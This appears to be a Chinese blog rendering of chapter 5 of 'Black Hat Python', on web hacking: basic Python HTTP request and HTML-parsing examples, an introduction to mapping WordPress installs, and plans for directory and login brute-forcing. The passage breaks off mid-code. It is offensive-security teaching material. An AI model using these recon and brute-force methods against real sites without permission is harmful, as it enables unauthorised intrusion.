<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 5 | Ma9icCR</title><meta name="description" content="WEB HACKERY–WEB黑客对任何攻击者或渗透测试者来说，分析web应用程序的能力是绝对关键的技能。在大多数现代网络中，web应用程序有着最大的攻击面，因此也是访问web应用程序本身的最常见途径。 您将发现许多用Python编写的优秀web应用程序工具，包括 w3af 和 sqlmap 。坦率地说，像SQL注入这样的topic已经被扼杀了，可用的工具已经足够成熟，我们不需要重新造轮子。相反，"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-5/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 5"><meta property="og:url" content="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-5/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="WEB HACKERY–WEB黑客对任何攻击者或渗透测试者来说，分析web应用程序的能力是绝对关键的技能。在大多数现代网络中，web应用程序有着最大的攻击面，因此也是访问web应用程序本身的最常见途径。 您将发现许多用Python编写的优秀web应用程序工具，包括 w3af 和 sqlmap 。坦率地说，像SQL注入这样的topic已经被扼杀了，可用的工具已经足够成熟，我们不需要重新造轮子。相反，"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-06-28T12:12:29.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:26.506Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 6" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-6/"><link rel="next" title="Black Hat Python 2nd 4" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-4/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:26'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-HACKERY–WEB黑客"><span class="toc-number">1.</span> <span class="toc-text">WEB HACKERY–WEB黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用Web库"><span class="toc-number">1.1.</span> <span class="toc-text">使用Web库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-urllib2-Library-for-Python-2-x"><span class="toc-number">1.1.1.</span> <span class="toc-text">The urllib2 Library for Python 2.x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-urllib-Library-for-Python-3-x"><span class="toc-number">1.1.2.</span> <span class="toc-text">The urllib Library for Python 3.x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#requests库"><span class="toc-number">1.1.3.</span> <span class="toc-text">requests库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lxml和BeautifulSoup包"><span class="toc-number">1.1.4.</span> <span class="toc-text">lxml和BeautifulSoup包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#映射开源Web应用程序的安装"><span class="toc-number">1.2.</span> <span class="toc-text">映射开源Web应用程序的安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#映射WordPress框架"><span class="toc-number">1.2.1.</span> <span class="toc-text">映射WordPress框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试活跃目标"><span class="toc-number">1.2.2.</span> <span class="toc-text">测试活跃目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.2.3.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解目录和文件位置"><span class="toc-number">1.3.</span> <span class="toc-text">暴力破解目录和文件位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力HTML表单验证"><span class="toc-number">1.4.</span> <span class="toc-text">暴力HTML表单验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 5</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-06-28 20:12:29"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-06-28</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:26"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="WEB-HACKERY–WEB黑客"><a href="#WEB-HACKERY–WEB黑客" class="headerlink" title="WEB HACKERY–WEB黑客"></a>WEB HACKERY–WEB黑客</h1><p>对任何攻击者或渗透测试者来说，分析web应用程序的能力是绝对关键的技能。在大多数现代网络中，web应用程序有着最大的攻击面，因此也是访问web应用程序本身的最常见途径。</p>
<p>您将发现许多用Python编写的优秀web应用程序工具，包括 w3af 和 sqlmap 。坦率地说，像SQL注入这样的topic已经被扼杀了，可用的工具已经足够成熟，我们不需要重新造轮子。相反，我们将探索使用Python与web交互的基础知识，然后在此基础上创建侦察和暴力工具。通过创建一些不同的工具，您应该会学习到构建特定攻击场景所需的任何类型的web应用程序评估工具所需的基本技能。</p>
<p>在本章中，我们将聚焦攻击web应用程序的三种场景。在第一种场景中，你知道目标使用的web工作框架，而这个框架恰好是开源的。一个web应用框架包含许多文件和嵌套式的目录。我们将创建一个大纲，在本地显示web应用程序的层次结构，并使用该信息定位活动目标上的真实文件和目录。</p>
<p>在第二个场景中，您只知道目标的URL，因此我们将通过使用单词列表来生成可能出现在目标上的文件路径和目录名的列表，从而暴力使用相同类型的映射。然后，我们将尝试连接到针对活动目标的可能路径的结果列表。</p>
<p>在第三个场景中，您知道目标及其登录页面的URL。我们将检查登录页面并使用单词列表暴力破解登录。</p>
<h2 id="使用Web库"><a href="#使用Web库" class="headerlink" title="使用Web库"></a>使用Web库</h2><p>我们将从学习可以用于与web服务交互的库开始。在执行基于网络的攻击时，您可能使用自己的计算机或正在受攻击的网络中的计算机。如果您使用的是一台受损的机器，您将不得不使用现有的可能是只基本安装了一个Python 2.x或Python 3.x的设备。我们将看看在这些情况下使用标准库可以做什么。然而，在本章的其余部分，我们将假设您在攻击者的计算机上使用最新的软件包。</p>
<h3 id="The-urllib2-Library-for-Python-2-x"><a href="#The-urllib2-Library-for-Python-2-x" class="headerlink" title="The urllib2 Library for Python 2.x"></a>The urllib2 Library for Python 2.x</h3><p>您将看到在为Python 2.x编写的代码中使用的 <em>urllib2</em> 库。它被绑定到标准库中。就像用于编写网络工具的 <em>socket</em> 库一样，人们使用 <em>urllib2</em> 库来创建与web服务交互的工具。让我们看一下代码，它是产生一个非常简单的GET请求到No Starch Press网站:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">url = <span class="string">'https://www.nostarch.com'</span></span><br><span class="line">[<span class="number">1</span>] response = urllib2.urlopen(url) <span class="comment"># GET</span></span><br><span class="line">[<span class="number">2</span>] print(response.read())</span><br><span class="line">response.close()</span><br></pre></td></tr></table></figure>

<p>这是如何向网站发出GET请求的最简单的例子。我们将URL传递给 <em>urlopen</em> 函数[1]，该函数返回一个类文件对象，该对象允许我们读取远程web服务器返回的内容[2]。因为我们只是从No Starch网站获取原始页面，所以没有执行JavaScript或其他客户端语言。</p>
<p>然而，在大多数情况下，您需要对如何发出这些请求进行更细粒度的控制，包括能够定义特定的头、处理cookie和创建POST请求。<em>urllib2</em> 库包含一个提供这种级别控制的 <em>Request</em> 类。下面的例子展示了如何使用<em>Request</em> 类和定义一个自定义的 <em>User-Agent</em> HTTP头来创建相同的GET请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">url = <span class="string">"https://www.nostarch.com"</span></span><br><span class="line">[<span class="number">1</span>] headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">"Googlebot"</span>&#125;</span><br><span class="line">[<span class="number">2</span>] request  = urllib2.Request(url,headers=headers)</span><br><span class="line">[<span class="number">3</span>] response = urllib2.urlopen(request)</span><br><span class="line">print(response.read())</span><br><span class="line">response.close()</span><br></pre></td></tr></table></figure>

<p><em>Request</em> 对象的构造与前面的示例略有不同。为了创建自定义的头，我们定义了一个 <em>headers</em> 字典[1]，它允许我们之后设置想要使用的头的键和值。在本例中，我们将使我们的Python脚本看起来像是 Googlebot。然后创建我们的 <em>Request</em> 对象并传入 <em>url</em> 和 <em>headers</em> 字典[2]，然后将 <em>Request</em> 对象传递给 <em>urlopen</em> 函数调用[3]。这将返回一个普通的类文件对象，我们可以使用该对象从远程网站读取数据。</p>
<p>(笔者注：Googlebot： Googlebot 是谷歌使用的搜索机器人软件，它从网络上收集文档，为谷歌搜索引擎建立一个可搜索的索引。)</p>
<h3 id="The-urllib-Library-for-Python-3-x"><a href="#The-urllib-Library-for-Python-3-x" class="headerlink" title="The urllib Library for Python 3.x"></a>The urllib Library for Python 3.x</h3><p>Python 3.x的标准库提供了 <em>urllib</em> 包，它将 <em>urllib2</em> 包中的功能拆分到 <em>urllib.Request</em> 和 <em>urllib.error</em> 子包中。它还通过子包 <em>urllib.parse</em> 增加了url解析功能。</p>
<p>要使用此包发出HTTP请求，您可以使用 <em>with</em> 语句将请求编码为上下文管理器。得到的响应应该包含一个字节字符串。下面是如何发出GET请求的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">[<span class="number">2</span>] url = <span class="string">'http://boodelyboo.com'</span></span><br><span class="line">[<span class="number">3</span>] <span class="keyword">with</span> urllib.request.urlopen(url) <span class="keyword">as</span> response:  <span class="comment"># GET</span></span><br><span class="line">    [<span class="number">4</span>] content = response.read()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p>在这里，我们导入需要的包[1]并定义目标URL [2]。然后，使用 <em>urlopen</em> 类函数作为上下文管理器，我们发出请求[3]并读取响应[4]。</p>
<p>要创建POST请求，请将数据字典编码为字节传递给请求对象。这个数据字典应该具有目标web应用程序所期望的键-值对。在这个例子中，<em>info</em> 字典包含登录目标网站所需的凭据 (<em>user, passwd</em>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">info = &#123;<span class="string">'user'</span>: <span class="string">'tim'</span>, <span class="string">'passwd'</span>: <span class="string">'31337'</span>&#125;</span><br><span class="line">[<span class="number">1</span>] data = urllib.parse.urlencode(info).encode() <span class="comment"># data is now of type bytes</span></span><br><span class="line">[<span class="number">2</span>] req = urllib.request.Request(url, data)</span><br><span class="line"><span class="keyword">with</span> urllib.request.urlopen(req) <span class="keyword">as</span> response:  <span class="comment"># POST</span></span><br><span class="line">[<span class="number">3</span>] content = response.read()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p>我们对包含登录凭据的数据字典进行编码，使其成为一个字节对象[1]，将其放入发送凭据的POST请求中[2]，并接收web应用程序对登录尝试的响应[3]。</p>
<h3 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h3><p>甚至官方Python文档也推荐在更高层级的HTTP客户端接口使用 <em>requests</em> 库。它不在标准库中，所以您必须安装它。下面是如何使用 <em>pip</em> 完成:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<p><em>request</em> 库非常有用，因为它可以自动为你处理cookie，正如你将在后面的每个例子中看到的，特别是在第85页的“Brute-Forcing HTML Form Authentication”中攻击 WordPress 站点的例子中。要发出HTTP请求，请执行以下操作:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =  <span class="string">'http://boodelyboo.com'</span></span><br><span class="line">response = requests.get(url) <span class="comment"># GET</span></span><br><span class="line">data = &#123;<span class="string">'user'</span>: <span class="string">'tim'</span>, <span class="string">'passwd'</span>: <span class="string">'31337'</span>&#125;</span><br><span class="line">[<span class="number">1</span>] response = requests.post(url, data=data) <span class="comment"># POST</span></span><br><span class="line">[<span class="number">2</span>] print(response.text) <span class="comment"># response.text = string; response.content = bytestring</span></span><br></pre></td></tr></table></figure>

<p>我们创建 <em>url</em> 、<em>request</em> 和一个包含 <em>user</em> 和 <em>passwd</em> 键的 <em>data</em> 字典。然后我们发布请求[1]并打印 <em>text</em> 属性(一个字符串)[2]。如果您更喜欢使用字节字符串，可以用从post返回的 <em>content</em> 属性。你将在85页的“Brute-Forcing HTML Form Authentication”中看到例子。</p>
<h3 id="lxml和BeautifulSoup包"><a href="#lxml和BeautifulSoup包" class="headerlink" title="lxml和BeautifulSoup包"></a>lxml和BeautifulSoup包</h3><p>一旦有了HTTP响应，<em>lxml</em> 或 <em>BeautifulSoup</em> 包都可以帮助解析内容。在过去的几年里，这两个软件包变得更加相似;可以在 <em>BeautifulSoup</em> 包中使用 <em>lxml</em> 解析器，在 <em>lxml</em> 包中使用 <em>BeautifulSoup</em> 解析器。</p>
<p>您将看到使用其中一种的其他黑客的代码。<em>lxml</em> 包提供了稍微快速一点的解析器，而 <em>BeautifulSoup</em> 包具有自动检测目标HTML页面编码的功能。我们将在这里使用的是 <em>lxml</em> 包。用 <em>pip</em> 安装任意一个包:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>

<p>假设您将请求的HTML内容存储在一个名为 <em>content</em> 的变量中。使用 <em>lxml</em> ，你可以像下面这样检索内容和解析链接:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =  <span class="string">'https://nostarch.com</span></span><br><span class="line"><span class="string">[2] r = requests.get(url) # GET</span></span><br><span class="line"><span class="string">content = r.content   # content is of type '</span>bytes<span class="string">'</span></span><br><span class="line"><span class="string">parser = etree.HTMLParser()</span></span><br><span class="line"><span class="string">[3] content = etree.parse(BytesIO(content), parser=parser) # Parse into tree</span></span><br><span class="line"><span class="string">[4] for link in content.findall('</span>//a<span class="string">'):  # find all "a" anchor elements.</span></span><br><span class="line"><span class="string">    [5] print(f"&#123;link.get('</span>hre<span class="string">f')&#125; -&gt; <span class="subst">&#123;link.text&#125;</span>")</span></span><br></pre></td></tr></table></figure>

<p>我们从 <em>io</em> 模块导入 <em>BytesIO</em> 类[1]，因为在解析HTTP响应时，我们需要它来把字节字符串用作文件对象。接下来，我们像往常一样执行GET请求[2]，然后使用 <em>lxml</em> HTML解析器解析响应。解析器需要一个类文件对象或文件名。<em>BytesIO</em> 类使我们能够将返回的字节字符串内容作为类似文件的对象传递给 <em>lxml</em> 解析器[3]。我们使用一个简单的查询来查找返回内容中包含链接的所有 <em>a</em> (anchor) 标签并打印结果[4]。每个anchor标签定义一个链接。它的 <em>href</em> 属性指定了链接的URL。</p>
<p>请注意[5]这里实际完成编码的 f-strings 的使用。在Python 3.6及更高版本中，您可以使用 f-strings 创建包含括在大括号内的变量值的字符串。这允许您很轻松地做一些事情，比如在字符串中包含调用函数的结果(link.get(‘href’))或简单值(link.text)。</p>
<p>使用 <em>BeautifulSoup</em> ，您可以对此代码进行同样的解析。正如你所看到的，这种技术非常类似于我们上一个使用 <em>lxml</em> 的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =  <span class="string">'http://bing.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">[<span class="number">1</span>] tree = bs(r.text, <span class="string">'html.parser'</span>) <span class="comment"># Parse into tree</span></span><br><span class="line">[<span class="number">2</span>] <span class="keyword">for</span> link <span class="keyword">in</span> tree.find_all(<span class="string">'a'</span>):  <span class="comment"># find all "a" anchor elements.</span></span><br><span class="line">    [<span class="number">3</span>] print(<span class="string">f"<span class="subst">&#123;link.get(<span class="string">'href'</span>)&#125;</span> -&gt; <span class="subst">&#123;link.text&#125;</span>"</span>)</span><br></pre></td></tr></table></figure>

<p>语法几乎完全相同。我们将内容解析为一个树[1]，遍历链接( <em>a</em> 或 <em>anchor</em> 的标签)[2]，并打印目标( <em>href</em> 属性)和链接文本 ( <em>link.text</em> ) [3]。</p>
<p>如果您在一台受损的机器上工作，您可能会避免安装这些第三方包，以避免产生太多的网络噪音，因此您只能使用手边的任何东西，可能是一个基本的Python 2或Python 3安装。这意味着您将使用标准库(分别是 <em>urllib2</em> 或 <em>urllib</em> )。</p>
<p>在下面的示例中，我们假设您正在攻击机中，这意味着您可以使用 <em>requests</em> 包连接web服务器，并使用 <em>lxml</em> 解析您检索到的输出。</p>
<p>现在您已经拥有了与web服务和网站交互的基本方法，让我们为攻击任意web应用程序或渗透测试创建一些有用的工具。</p>
<h2 id="映射开源Web应用程序的安装"><a href="#映射开源Web应用程序的安装" class="headerlink" title="映射开源Web应用程序的安装"></a>映射开源Web应用程序的安装</h2><p>内容管理系统(CMSs)和博客平台(如Joomla、WordPress和Drupal，它们使创建一个新的博客或网站变得简单)，它们在共享托管环境甚至企业网络中相对常见。所有系统在安装、配置和补丁管理方面都有自己的挑战，这些CMS套件也不例外。当超负荷工作的系统管理员或倒霉的web开发人员没有遵守所有的安全和安装步骤时，攻击者很容易获得访问web服务器的机会。</p>
<p>因为我们可以下载任何开源web应用程序，并在本地确定它的文件和目录结构，所以我们可以创建一个专门构建的扫描器，它可以搜索远程目标上可访问的所有文件。这可以根除剩余的应该由 <em>.htaccess</em> 文件保护的安装文件和目录，以及其他可以帮助攻击者在web服务器上站稳脚跟的好东西。</p>
<p>这个部分还向您介绍了如何使用Python <em>Queue</em> 对象，它帮助我们构建一个大型的、线程安全的项目堆栈，并让多个线程挑选进行处理的项目。这将使我们的扫描器运行得非常快。此外，我们可以相信不会出现竞争条件，因为我们使用的是线程安全的队列，而不是列表。</p>
<h3 id="映射WordPress框架"><a href="#映射WordPress框架" class="headerlink" title="映射WordPress框架"></a>映射WordPress框架</h3><p>假设你知道你的目标web应用使用WordPress框架。让我们看看WordPress的安装是什么样的。下载并解压一个本地的WordPress副本。你可以通过<a href="https://wordpress.org/download/" target="_blank" rel="noopener">https://wordpress.org/download/</a>获取最新的版本。这里我们使用的是WordPress的5.4版本。尽管文件的布局可能与您的目标服务器不同，但它为我们提供了一个合理的起点，用于查找大多数版本中存在的文件和目录。</p>
<p>为了获得标准WordPress发行版中的目录和文件名的部署情况，我们创建一个名为 <em>mapper.py</em> 的新文件。让我们编写一个名为 <em>gather_paths</em> 的函数来遍历目录，将每个完整的文件路径插入到一个名为 <em>web_paths</em> 的队列中:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> contextlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span 